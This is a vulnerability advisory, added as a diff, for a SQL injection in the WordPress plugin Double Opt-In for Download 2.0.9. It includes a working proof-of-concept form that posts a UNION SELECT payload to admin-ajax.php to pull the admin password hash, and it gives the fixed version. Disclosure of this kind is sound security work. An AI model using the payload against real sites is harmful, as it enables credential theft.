@@ -1,0 +1,29 @@
+# Exploit Title: Double Opt-In for Download 2.0.9 Sql Injection
+# Date: 06-06-2016
+# Software Link: https://wordpress.org/plugins/double-opt-in-for-download/
+# Exploit Author: Kacper Szurek
+# Contact: http://twitter.com/KacperSzurek
+# Website: http://security.szurek.pl/
+# Category: webapps
+ 
+1. Description
+   
+`$_POST['id']` is not escaped.
+
+`populate_download_edit_form()` is accessible for every registered user.
+
+http://security.szurek.pl/double-opt-in-for-download-209-sql-injection.html
+
+
+2. Proof of Concept
+
+Login as regular user.
+
+<form name="xss" action="http://wordpress-url/wp-admin/admin-ajax.php?action=populate_download_edit_form" method="post">
+	<input type="text" name="id" value="0 UNION SELECT 1, 2, 4, 5, 6, 7, user_pass FROM wp_users WHERE ID=1">
+	<input type="submit" value="Send">
+</form>
+
+3. Solution:
+   
+Update to version 2.1.0
